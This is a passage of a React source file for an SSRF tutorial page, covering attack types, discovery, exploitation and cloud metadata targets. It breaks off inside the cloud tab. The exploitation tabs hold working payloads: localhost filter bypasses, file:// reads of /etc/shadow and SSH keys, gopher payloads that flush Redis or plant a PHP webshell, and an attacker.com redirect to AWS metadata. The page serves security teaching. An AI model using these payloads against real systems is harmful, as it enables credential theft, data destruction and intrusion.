import React, { useState } from "react";
import LearnPageLayout from "../components/LearnPageLayout";
import {
  Box,
  Typography,
  Container,
  Paper,
  Tabs,
  Tab,
  Alert,
  AlertTitle,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Grid,
  Card,
  CardContent,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  Chip,
  Divider,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  IconButton,
  Tooltip,
  alpha,
  useTheme,
} from "@mui/material";
import { useNavigate } from "react-router-dom";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import ContentCopyIcon from "@mui/icons-material/ContentCopy";
import CloudIcon from "@mui/icons-material/Cloud";
import SecurityIcon from "@mui/icons-material/Security";
import BugReportIcon from "@mui/icons-material/BugReport";
import StorageIcon from "@mui/icons-material/Storage";
import PublicIcon from "@mui/icons-material/Public";
import LockIcon from "@mui/icons-material/Lock";
import WarningIcon from "@mui/icons-material/Warning";
import SearchIcon from "@mui/icons-material/Search";
import ShieldIcon from "@mui/icons-material/Shield";
import CodeIcon from "@mui/icons-material/Code";
import BuildIcon from "@mui/icons-material/Build";
import HistoryIcon from "@mui/icons-material/History";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import CancelIcon from "@mui/icons-material/Cancel";
import DnsIcon from "@mui/icons-material/Dns";
import HttpIcon from "@mui/icons-material/Http";
import LanguageIcon from "@mui/icons-material/Language";
import LinkIcon from "@mui/icons-material/Link";

// TabPanel component
interface TabPanelProps {
  children?: React.ReactNode;
  index: number;
  value: number;
}

function TabPanel(props: TabPanelProps) {
  const { children, value, index, ...other } = props;
  return (
    <div role="tabpanel" hidden={value !== index} {...other}>
      {value === index && <Box sx={{ py: 3 }}>{children}</Box>}
    </div>
  );
}

// Code block component
interface CodeBlockProps {
  title?: string;
  children: string;
}

function CodeBlock({ title, children }: CodeBlockProps) {
  const [copied, setCopied] = useState(false);
  const theme = useTheme();

  const handleCopy = () => {
    navigator.clipboard.writeText(children);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <Paper
      sx={{
        mt: 2,
        mb: 2,
        overflow: "hidden",
        border: `1px solid ${alpha(theme.palette.primary.main, 0.2)}`,
      }}
    >
      {title && (
        <Box
          sx={{
            px: 2,
            py: 1,
            bgcolor: alpha(theme.palette.primary.main, 0.1),
            borderBottom: `1px solid ${alpha(theme.palette.primary.main, 0.2)}`,
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
          }}
        >
          <Typography variant="caption" fontWeight="bold" color="primary">
            {title}
          </Typography>
          <Tooltip title={copied ? "Copied!" : "Copy"}>
            <IconButton size="small" onClick={handleCopy}>
              <ContentCopyIcon fontSize="small" />
            </IconButton>
          </Tooltip>
        </Box>
      )}
      <Box
        component="pre"
        sx={{
          m: 0,
          p: 2,
          overflow: "auto",
          bgcolor: theme.palette.mode === "dark" ? "#1a1a2e" : "#f8f9fa",
          fontSize: "0.85rem",
          fontFamily: "monospace",
        }}
      >
        <code>{children}</code>
      </Box>
    </Paper>
  );
}

// Data arrays
const ssrfTypes = [
  { type: "Basic SSRF", desc: "Direct request to attacker-controlled URL", severity: "High", example: "Fetch URL parameter directly used in server request" },
  { type: "Blind SSRF", desc: "No direct response, must infer via timing/side-channels", severity: "Medium", example: "Webhook URL that doesn't return response content" },
  { type: "Semi-Blind SSRF", desc: "Partial response data returned (headers, status codes)", severity: "Medium", example: "Error messages reveal internal network info" },
  { type: "Full-Response SSRF", desc: "Complete response returned to attacker", severity: "Critical", example: "URL preview feature shows full page content" },
];

const commonTargets = [
  { target: "Cloud Metadata", endpoint: "169.254.169.254", risk: "Credential theft, instance takeover", protocol: "HTTP" },
  { target: "Internal APIs", endpoint: "localhost:8080", risk: "Authentication bypass, data access", protocol: "HTTP/HTTPS" },
  { target: "Admin Panels", endpoint: "127.0.0.1:8000/admin", risk: "Full system compromise", protocol: "HTTP" },
  { target: "Databases", endpoint: "internal-db:5432", risk: "Data exfiltration", protocol: "PostgreSQL" },
  { target: "Redis/Memcache", endpoint: "127.0.0.1:6379", risk: "Cache poisoning, RCE", protocol: "Redis/Gopher" },
  { target: "Elasticsearch", endpoint: "localhost:9200", risk: "Data access, cluster control", protocol: "HTTP" },
  { target: "Docker API", endpoint: "127.0.0.1:2375", risk: "Container escape, host compromise", protocol: "HTTP" },
  { target: "Kubernetes API", endpoint: "kubernetes.default.svc", risk: "Cluster takeover", protocol: "HTTPS" },
];

const bypassTechniques = [
  { technique: "IP Encoding (Decimal)", example: "2130706433", desc: "127.0.0.1 as decimal integer" },
  { technique: "IP Encoding (Octal)", example: "0177.0.0.1 or 017700000001", desc: "Octal representation" },
  { technique: "IP Encoding (Hex)", example: "0x7f.0x0.0x0.0x1 or 0x7f000001", desc: "Hexadecimal representation" },
  { technique: "IPv6 Localhost", example: "::1, ::ffff:127.0.0.1", desc: "IPv6 loopback addresses" },
  { technique: "DNS Rebinding", example: "attacker.com → 127.0.0.1", desc: "DNS record changes between checks" },
  { technique: "URL Parsing Confusion", example: "http://evil.com#@internal", desc: "Exploit parser differences" },
  { technique: "Protocol Smuggling", example: "gopher://, dict://, file://", desc: "Alternative protocols" },
  { technique: "Redirect Chains", example: "302 → 302 → internal", desc: "External redirects to internal" },
  { technique: "URL Shorteners", example: "bit.ly/xxx → internal", desc: "Hide target behind shortener" },
  { technique: "Wildcard DNS", example: "127.0.0.1.nip.io", desc: "DNS services that resolve to any IP" },
  { technique: "Unicode/Punycode", example: "ⓛⓞⓒⓐⓛⓗⓞⓢⓣ", desc: "Unicode domain normalization" },
  { technique: "CRLF Injection", example: "url%0d%0aHost:%20internal", desc: "HTTP header injection" },
];

const preventionMethods = [
  { method: "Input Validation", desc: "Whitelist allowed URLs and domains", priority: "Critical" },
  { method: "Network Segmentation", desc: "Isolate sensitive services from web tier", priority: "High" },
  { method: "Disable Protocols", desc: "Block file://, gopher://, dict://", priority: "High" },
  { method: "Metadata Blocking", desc: "Block 169.254.169.254 at network level", priority: "Critical" },
  { method: "Response Filtering", desc: "Don't return raw responses to users", priority: "Medium" },
  { method: "Timeout Controls", desc: "Limit request duration", priority: "Medium" },
  { method: "DNS Resolution Check", desc: "Validate resolved IP addresses", priority: "Critical" },
  { method: "Egress Firewall", desc: "Control outbound connections", priority: "High" },
];

const realWorldBreaches = [
  { company: "Capital One (2019)", impact: "100M+ customer records", method: "AWS metadata SSRF", bounty: "N/A - Criminal case" },
  { company: "Shopify", impact: "Internal systems access", method: "SSRF in merchant dashboard", bounty: "$25,000" },
  { company: "GitLab", impact: "Internal network scanning", method: "Webhook SSRF", bounty: "$12,000" },
  { company: "Uber", impact: "AWS credentials exposed", method: "SSRF in image processing", bounty: "$10,000" },
  { company: "Facebook", impact: "Internal infrastructure", method: "SSRF in career portal", bounty: "$31,500" },
];

const vulnerableFunctions = [
  { lang: "Python", func: "requests.get(url)", lib: "requests", risk: "High" },
  { lang: "Python", func: "urllib.request.urlopen(url)", lib: "urllib", risk: "High" },
  { lang: "Python", func: "httpx.get(url)", lib: "httpx", risk: "High" },
  { lang: "Node.js", func: "axios.get(url)", lib: "axios", risk: "High" },
  { lang: "Node.js", func: "fetch(url)", lib: "node-fetch", risk: "High" },
  { lang: "Node.js", func: "http.get(url)", lib: "http", risk: "High" },
  { lang: "Java", func: "URL.openConnection()", lib: "java.net", risk: "High" },
  { lang: "Java", func: "HttpClient.send()", lib: "java.net.http", risk: "High" },
  { lang: "PHP", func: "file_get_contents(url)", lib: "core", risk: "Critical" },
  { lang: "PHP", func: "curl_exec()", lib: "curl", risk: "High" },
  { lang: "Ruby", func: "Net::HTTP.get(url)", lib: "net/http", risk: "High" },
  { lang: "Go", func: "http.Get(url)", lib: "net/http", risk: "High" },
];

const cloudMetadataEndpoints = [
  { provider: "AWS", endpoint: "http://169.254.169.254/latest/meta-data/", sensitive: "iam/security-credentials/" },
  { provider: "AWS IMDSv2", endpoint: "Token required via PUT request", sensitive: "Harder to exploit" },
  { provider: "GCP", endpoint: "http://metadata.google.internal/computeMetadata/v1/", sensitive: "instance/service-accounts/" },
  { provider: "Azure", endpoint: "http://169.254.169.254/metadata/instance", sensitive: "?api-version=2021-02-01" },
  { provider: "DigitalOcean", endpoint: "http://169.254.169.254/metadata/v1/", sensitive: "user-data, region" },
  { provider: "Oracle Cloud", endpoint: "http://169.254.169.254/opc/v1/", sensitive: "instance/metadata/" },
  { provider: "Alibaba Cloud", endpoint: "http://100.100.100.200/latest/meta-data/", sensitive: "ram/security-credentials/" },
  { provider: "Kubernetes", endpoint: "https://kubernetes.default.svc/api/v1/", sensitive: "secrets, configmaps" },
];

const ssrfTools = [
  { name: "Burp Collaborator", type: "Detection", desc: "Out-of-band interaction detection" },
  { name: "SSRFmap", type: "Exploitation", desc: "Automatic SSRF fuzzer and exploitation" },
  { name: "Gopherus", type: "Payload Gen", desc: "Generate gopher payloads for various services" },
  { name: "ffuf", type: "Fuzzing", desc: "Fast web fuzzer for parameter discovery" },
  { name: "nuclei", type: "Scanning", desc: "SSRF templates for automated detection" },
  { name: "interactsh", type: "Detection", desc: "Open-source OOB interaction server" },
];

const SSRFGuidePage: React.FC = () => {
  const [tabValue, setTabValue] = useState(0);
  const navigate = useNavigate();
  const theme = useTheme();

  const handleTabChange = (_: React.SyntheticEvent, newValue: number) => {
    setTabValue(newValue);
  };

  const pageContext = `This page covers Server-Side Request Forgery (SSRF) vulnerabilities, explaining how attackers trick servers into making requests to unintended locations. Topics include SSRF attack types (basic, blind, full-response), common targets like cloud metadata services (AWS, GCP, Azure), filter bypass techniques (IP encoding, DNS rebinding, protocol smuggling), exploitation methods, and prevention strategies including URL validation, network segmentation, and cloud-specific hardening.`;

  return (
    <LearnPageLayout pageTitle="Server-Side Request Forgery (SSRF)" pageContext={pageContext}>
    <Container maxWidth="xl" sx={{ py: 4 }}>
      {/* Header */}
      <Box sx={{ mb: 4 }}>
        <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
          <IconButton onClick={() => navigate("/learn")} sx={{ color: "primary.main" }}>
            <ArrowBackIcon />
          </IconButton>
          <CloudIcon sx={{ fontSize: 40, color: "primary.main" }} />
          <Box>
            <Typography variant="h4" fontWeight="bold">
              Server-Side Request Forgery (SSRF)
            </Typography>
            <Typography variant="subtitle1" color="text.secondary">
              Understanding and preventing SSRF vulnerabilities
            </Typography>
          </Box>
        </Box>
      </Box>

      {/* Introduction Section */}
      <Paper sx={{ p: 4, mb: 4, borderRadius: 2 }}>
        <Typography variant="h5" gutterBottom color="primary" fontWeight="bold">
          What is Server-Side Request Forgery?
        </Typography>
        
        <Typography paragraph sx={{ fontSize: "1.1rem", lineHeight: 1.8 }}>
          <strong>Server-Side Request Forgery (SSRF)</strong> is a web security vulnerability that allows an attacker 
          to make a server perform requests to unintended locations. Think of it like tricking a librarian into 
          fetching books from a restricted section - you can't go there yourself, but you can convince someone 
          with access to go for you.
        </Typography>

        <Typography paragraph sx={{ fontSize: "1.1rem", lineHeight: 1.8 }}>
          <strong>How does it work?</strong> Many web applications fetch data from URLs - for example, a profile 
          picture URL, a webhook endpoint, or a document to convert. If the application doesn't validate these 
          URLs properly, an attacker can provide a URL pointing to internal systems that shouldn't be accessible 
          from the outside.
        </Typography>

        <Typography paragraph sx={{ fontSize: "1.1rem", lineHeight: 1.8 }}>
          <strong>Why is it dangerous?</strong> The server making the request typically has access to internal 
          networks, cloud metadata services, and other resources that external attackers cannot reach directly. 
          SSRF essentially turns a web server into a proxy for attacking internal infrastructure.
        </Typography>

        <Grid container spacing={2} sx={{ mb: 3 }}>
          {[
            { icon: <StorageIcon />, title: "Access Internal Services", desc: "Reach databases, APIs, and admin panels behind firewalls" },
            { icon: <SecurityIcon />, title: "Steal Cloud Credentials", desc: "Access metadata services like AWS, GCP, Azure" },
            { icon: <BugReportIcon />, title: "Port Scanning", desc: "Map internal network infrastructure" },
            { icon: <PublicIcon />, title: "Bypass Access Controls", desc: "Access resources restricted by IP allowlists" },
          ].map((item) => (
            <Grid item xs={12} sm={6} md={3} key={item.title}>
              <Card variant="outlined" sx={{ height: "100%" }}>
                <CardContent>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1, color: "error.main" }}>
                    {item.icon}
                    <Typography variant="subtitle2" fontWeight="bold">{item.title}</Typography>
                  </Box>
                  <Typography variant="body2" color="text.secondary">{item.desc}</Typography>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>

        <Alert severity="error" sx={{ mt: 2 }}>
          <AlertTitle>OWASP Top 10 - A10:2021</AlertTitle>
          SSRF was added to the OWASP Top 10 in 2021, reflecting its increasing prevalence and impact, 
          especially in cloud environments where metadata services are common attack targets.
        </Alert>
      </Paper>

      {/* Tabs */}
      <Paper sx={{ borderRadius: 2 }}>
        <Tabs
          value={tabValue}
          onChange={handleTabChange}
          variant="scrollable"
          scrollButtons="auto"
          sx={{ borderBottom: 1, borderColor: "divider", px: 2 }}
        >
          <Tab icon={<BugReportIcon />} label="Attack Types" />
          <Tab icon={<SearchIcon />} label="Discovery" />
          <Tab icon={<WarningIcon />} label="Exploitation" />
          <Tab icon={<CloudIcon />} label="Cloud Attacks" />
          <Tab icon={<ShieldIcon />} label="Prevention" />
          <Tab icon={<BuildIcon />} label="Tools" />
          <Tab icon={<CodeIcon />} label="Code Examples" />
        </Tabs>

        {/* Tab 0: Attack Types */}
        <TabPanel value={tabValue} index={0}>
          <Typography variant="h5" gutterBottom>Types of SSRF Attacks</Typography>

          <TableContainer component={Paper} sx={{ mb: 3 }}>
            <Table>
              <TableHead>
                <TableRow sx={{ bgcolor: "action.hover" }}>
                  <TableCell><strong>Type</strong></TableCell>
                  <TableCell><strong>Description</strong></TableCell>
                  <TableCell><strong>Example</strong></TableCell>
                  <TableCell><strong>Severity</strong></TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {ssrfTypes.map((row) => (
                  <TableRow key={row.type}>
                    <TableCell><Typography fontWeight="bold" color="primary">{row.type}</Typography></TableCell>
                    <TableCell>{row.desc}</TableCell>
                    <TableCell><Typography variant="body2" color="text.secondary">{row.example}</Typography></TableCell>
                    <TableCell>
                      <Chip 
                        label={row.severity} 
                        size="small" 
                        color={row.severity === "Critical" ? "error" : row.severity === "High" ? "warning" : "info"} 
                      />
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>

          <Divider sx={{ my: 3 }} />

          <Typography variant="h6" gutterBottom>Common SSRF Targets</Typography>
          <TableContainer component={Paper} sx={{ mb: 3 }}>
            <Table>
              <TableHead>
                <TableRow sx={{ bgcolor: "action.hover" }}>
                  <TableCell><strong>Target</strong></TableCell>
                  <TableCell><strong>Endpoint</strong></TableCell>
                  <TableCell><strong>Protocol</strong></TableCell>
                  <TableCell><strong>Risk</strong></TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {commonTargets.map((row) => (
                  <TableRow key={row.target}>
                    <TableCell><Typography fontWeight="bold">{row.target}</Typography></TableCell>
                    <TableCell><code>{row.endpoint}</code></TableCell>
                    <TableCell><Chip label={row.protocol} size="small" variant="outlined" /></TableCell>
                    <TableCell>{row.risk}</TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>

          <Divider sx={{ my: 3 }} />

          <Typography variant="h6" gutterBottom>Real-World SSRF Breaches</Typography>
          <Alert severity="error" sx={{ mb: 2 }}>
            <AlertTitle>Impact of SSRF Vulnerabilities</AlertTitle>
            SSRF has led to some of the most significant data breaches in recent history.
          </Alert>
          <TableContainer component={Paper}>
            <Table>
              <TableHead>
                <TableRow sx={{ bgcolor: "action.hover" }}>
                  <TableCell><strong>Company</strong></TableCell>
                  <TableCell><strong>Impact</strong></TableCell>
                  <TableCell><strong>Method</strong></TableCell>
                  <TableCell><strong>Bounty/Outcome</strong></TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {realWorldBreaches.map((row) => (
                  <TableRow key={row.company}>
                    <TableCell><Typography fontWeight="bold" color="error">{row.company}</Typography></TableCell>
                    <TableCell>{row.impact}</TableCell>
                    <TableCell>{row.method}</TableCell>
                    <TableCell><Chip label={row.bounty} size="small" color="success" variant="outlined" /></TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>

          <Accordion sx={{ mt: 3 }}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Vulnerable Functions by Language</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <TableContainer>
                <Table size="small">
                  <TableHead>
                    <TableRow>
                      <TableCell><strong>Language</strong></TableCell>
                      <TableCell><strong>Function</strong></TableCell>
                      <TableCell><strong>Library</strong></TableCell>
                      <TableCell><strong>Risk</strong></TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {vulnerableFunctions.map((row, idx) => (
                      <TableRow key={idx}>
                        <TableCell>{row.lang}</TableCell>
                        <TableCell><code>{row.func}</code></TableCell>
                        <TableCell>{row.lib}</TableCell>
                        <TableCell>
                          <Chip label={row.risk} size="small" color={row.risk === "Critical" ? "error" : "warning"} />
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>
            </AccordionDetails>
          </Accordion>
        </TabPanel>

        {/* Tab 1: Discovery */}
        <TabPanel value={tabValue} index={1}>
          <Typography variant="h5" gutterBottom>Finding SSRF Vulnerabilities</Typography>

          <Alert severity="info" sx={{ mb: 3 }}>
            Look for any functionality that fetches external resources: URL imports, webhooks, 
            PDF generators, image processors, or API integrations.
          </Alert>

          <Typography variant="h6" gutterBottom>Common Vulnerable Parameters</Typography>
          <Grid container spacing={1} sx={{ mb: 3 }}>
            {["url", "uri", "path", "dest", "redirect", "link", "src", "source", "file", "document", "page", "callback", "return", "next", "data", "reference", "site", "html", "val", "validate", "domain", "window", "dir", "show", "navigation", "open", "img", "image", "load", "resource", "feed", "host", "port", "to", "out", "view", "content", "target"].map((param) => (
              <Grid item key={param}>
                <Chip label={param} variant="outlined" sx={{ fontFamily: "monospace" }} />
              </Grid>
            ))}
          </Grid>

          <Accordion defaultExpanded>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Vulnerable Functionality Types</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Grid container spacing={2}>
                {[
                  { title: "URL Preview/Unfurling", desc: "Slack-style link previews, social media cards", icon: <LinkIcon /> },
                  { title: "Webhooks", desc: "Callback URLs for notifications, payment gateways", icon: <HttpIcon /> },
                  { title: "File Import from URL", desc: "Import documents, images, or data from URLs", icon: <CloudIcon /> },
                  { title: "PDF/Image Generation", desc: "HTML to PDF converters, screenshot services", icon: <LanguageIcon /> },
                  { title: "Proxy/Gateway Services", desc: "URL shorteners, redirectors, API gateways", icon: <PublicIcon /> },
                  { title: "RSS/Feed Readers", desc: "Fetch and parse external RSS/Atom feeds", icon: <DnsIcon /> },
                  { title: "Avatar/Profile Picture", desc: "Gravatar-style URL-based avatars", icon: <StorageIcon /> },
                  { title: "OAuth Callbacks", desc: "Redirect URI parameters in OAuth flows", icon: <SecurityIcon /> },
                ].map((item) => (
                  <Grid item xs={12} sm={6} md={3} key={item.title}>
                    <Card variant="outlined" sx={{ height: "100%" }}>
                      <CardContent>
                        <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1, color: "warning.main" }}>
                          {item.icon}
                          <Typography variant="subtitle2" fontWeight="bold">{item.title}</Typography>
                        </Box>
                        <Typography variant="body2" color="text.secondary">{item.desc}</Typography>
                      </CardContent>
                    </Card>
                  </Grid>
                ))}
              </Grid>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Detection Techniques</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <List dense>
                <ListItem>
                  <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                  <ListItemText primary="Out-of-band (OOB) callbacks" secondary="Use Burp Collaborator, interactsh, or your own server to detect blind SSRF" />
                </ListItem>
                <ListItem>
                  <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                  <ListItemText primary="Timing analysis" secondary="Internal hosts often respond faster than external; compare response times" />
                </ListItem>
                <ListItem>
                  <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                  <ListItemText primary="Error message differences" secondary="Different errors for reachable vs unreachable hosts reveal internal topology" />
                </ListItem>
                <ListItem>
                  <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                  <ListItemText primary="Response size/content analysis" secondary="Internal vs external pages have different sizes and content" />
                </ListItem>
                <ListItem>
                  <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                  <ListItemText primary="DNS queries monitoring" secondary="Watch for DNS lookups to your controlled domains" />
                </ListItem>
              </List>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Testing Methodology</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="SSRF Testing Steps">{`# Step 1: Identify URL-accepting parameters
# Look for: url=, path=, src=, dest=, redirect=, uri=, callback=

# Step 2: Test with external callback
url=http://YOUR-COLLABORATOR-URL/test

# Step 3: Test localhost access
url=http://localhost/
url=http://127.0.0.1/
url=http://[::1]/

# Step 4: Test internal network
url=http://192.168.1.1/
url=http://10.0.0.1/
url=http://172.16.0.1/

# Step 5: Test cloud metadata
url=http://169.254.169.254/latest/meta-data/

# Step 6: Test alternative protocols
url=file:///etc/passwd
url=dict://localhost:6379/info
url=gopher://localhost:6379/_INFO

# Step 7: Apply bypass techniques if blocked
url=http://0x7f000001/
url=http://2130706433/
url=http://localhost.nip.io/`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Identifying Blind SSRF</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Alert severity="warning" sx={{ mb: 2 }}>
                Blind SSRF requires out-of-band techniques since you won't see the response directly.
              </Alert>
              <CodeBlock title="Blind SSRF Detection">{`# Using Burp Collaborator
callback_url=http://BURP-COLLABORATOR-SUBDOMAIN.burpcollaborator.net

# Using interactsh (open source alternative)
url=http://RANDOM.oast.fun

# Using your own server
# 1. Set up a simple HTTP server
python3 -m http.server 8080

# 2. Use ngrok or similar to expose it
ngrok http 8080

# 3. Use the ngrok URL in your tests
url=https://YOUR-NGROK-URL.ngrok.io/ssrf-test

# 4. Monitor server logs for incoming connections`}</CodeBlock>
            </AccordionDetails>
          </Accordion>
        </TabPanel>

        {/* Tab 2: Exploitation */}
        <TabPanel value={tabValue} index={2}>
          <Typography variant="h5" gutterBottom>SSRF Exploitation</Typography>

          <Alert severity="warning" sx={{ mb: 3 }}>
            <AlertTitle>Authorization Required</AlertTitle>
            Only test SSRF on systems you have explicit permission to test.
          </Alert>

          <Typography variant="h6" gutterBottom>Filter Bypass Techniques</Typography>
          <TableContainer component={Paper} sx={{ mb: 3 }}>
            <Table>
              <TableHead>
                <TableRow sx={{ bgcolor: "action.hover" }}>
                  <TableCell><strong>Technique</strong></TableCell>
                  <TableCell><strong>Example</strong></TableCell>
                  <TableCell><strong>Description</strong></TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {bypassTechniques.map((row) => (
                  <TableRow key={row.technique}>
                    <TableCell><Typography fontWeight="bold">{row.technique}</Typography></TableCell>
                    <TableCell><code>{row.example}</code></TableCell>
                    <TableCell><Typography variant="body2" color="text.secondary">{row.desc}</Typography></TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>

          <Accordion defaultExpanded>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">localhost Bypass Payloads</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="Comprehensive localhost Bypasses">{`# Decimal IP encoding
http://2130706433/              # 127.0.0.1
http://3232235521/              # 192.168.0.1
http://3232235777/              # 192.168.1.1
http://2886729729/              # 172.16.0.1

# Octal IP encoding
http://0177.0.0.1/
http://0177.0000.0000.0001/
http://017700000001/

# Hex IP encoding
http://0x7f.0x0.0x0.0x1/
http://0x7f000001/
http://0x7f.0.0.1/

# Mixed encoding
http://0177.0x0.0.0/
http://0x7f.0.1/

# IPv6 representations
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
http://[::ffff:127.0.0.1]/
http://[::ffff:7f00:1]/
http://[0000::1]/

# Shortened IPv6
http://[::127.0.0.1]/
http://[::]/ (binds to all interfaces)

# Wildcard DNS services
http://127.0.0.1.nip.io/
http://www.127.0.0.1.nip.io/
http://127.0.0.1.sslip.io/
http://localtest.me/           # Resolves to 127.0.0.1
http://spoofed.burpcollaborator.net/

# Rare but valid
http://127.1/
http://127.0.1/
http://0/
http://0.0.0.0/

# URL parsing quirks
http://localhost#@evil.com/
http://evil.com@localhost/
http://localhost:80#@evil.com/
http://localhost%00.evil.com/
http://localhost%09.evil.com/
http://localhost%2509/
http://127。0。0。1/ (fullwidth dots)`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Protocol Exploitation</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="Protocol-based attacks">{`# File protocol - Read local files
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
file://localhost/etc/passwd
file://127.0.0.1/etc/passwd

# Windows file paths
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/Users/Administrator/.ssh/id_rsa

# Gopher protocol - Interact with TCP services
# Redis - Flush all data
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a

# Redis - Write webshell
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$4%0d%0atest%0d%0a$17%0d%0a<?php%20phpinfo();?>%0d%0a

# Memcached interaction
gopher://127.0.0.1:11211/_stats%0d%0a

# SMTP - Send email
gopher://127.0.0.1:25/_HELO%20localhost%0d%0aMAIL%20FROM%3A%3Cattacker%40evil.com%3E%0d%0a

# Dict protocol - Banner grabbing
dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats

# LDAP protocol
ldap://127.0.0.1:389/
ldaps://127.0.0.1:636/

# FTP protocol
ftp://127.0.0.1:21/`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">DNS Rebinding Attack</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Alert severity="info" sx={{ mb: 2 }}>
                DNS rebinding bypasses IP-based validation by changing DNS resolution between the validation check and the actual request.
              </Alert>
              <CodeBlock title="DNS Rebinding Setup">{`# How DNS Rebinding Works:
# 1. Attacker controls DNS for evil.com
# 2. First query: evil.com → 1.2.3.4 (external IP, passes validation)
# 3. TTL expires quickly (or client re-queries)
# 4. Second query: evil.com → 127.0.0.1 (internal IP)
# 5. Request goes to internal address

# Tools for DNS Rebinding:
# - rbndr.us: Free DNS rebinding service
# - Singularity: https://github.com/nccgroup/singularity
# - Whonow: https://github.com/taviso/whonow

# Example with rbndr.us
# Creates a domain that alternates between two IPs
http://7f000001.c0a80001.rbndr.us/
# First resolve: 127.0.0.1
# Second resolve: 192.168.0.1

# Defense: Validate DNS after EVERY resolution, not just initial`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Redirect-Based Bypass</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="Using Redirects to Bypass Filters">{`# If the app follows redirects, you can bypass URL validation

# Step 1: Set up redirect on your server
# redirect.php:
<?php header("Location: http://169.254.169.254/latest/meta-data/"); ?>

# Step 2: Submit your external URL
url=http://attacker.com/redirect.php

# The app validates attacker.com (external = OK)
# Then follows redirect to internal IP

# Chained redirects
http://attacker.com/r1 → 302 → http://attacker.com/r2 → 302 → http://127.0.0.1/

# URL shorteners (if not blocked)
http://bit.ly/xxx → http://internal-system/

# Defense: Disable redirects or validate each hop
# Python: requests.get(url, allow_redirects=False)
# curl: curl -L --max-redirs 0`}</CodeBlock>
            </AccordionDetails>
          </Accordion>
        </TabPanel>

        {/* Tab 3: Cloud Attacks */}
        <TabPanel value={tabValue} index={3}>
          <Typography variant="h5" gutterBottom>Cloud Metadata Attacks</Typography>

          <Alert severity="error" sx={{ mb: 3 }}>
            <AlertTitle>Critical Risk</AlertTitle>
            Cloud metadata SSRF can lead to complete infrastructure compromise. The 2019 Capital One breach 
            exposed 100+ million records through AWS metadata SSRF.
          </Alert>

          <Typography variant="h6" gutterBottom>Cloud Provider Metadata Endpoints</Typography>
          <TableContainer component={Paper} sx={{ mb: 3 }}>
            <Table>
              <TableHead>
                <TableRow sx={{ bgcolor: "action.hover" }}>
                  <TableCell><strong>Provider</strong></TableCell>
                  <TableCell><strong>Endpoint</strong></TableCell>
                  <TableCell><strong>Sensitive Data</strong></TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {cloudMetadataEndpoints.map((row) => (
                  <TableRow key={row.provider}>
                    <TableCell><Typography fontWeight="bold" color="primary">{row.provider}</Typography></TableCell>
                    <TableCell><code style={{ fontSize: "0.8rem" }}>{row.endpoint}</code></TableCell>
                    <TableCell><Typography variant="body2">{row.sensitive}</Typography></TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>

          <Accordion defaultExpanded>
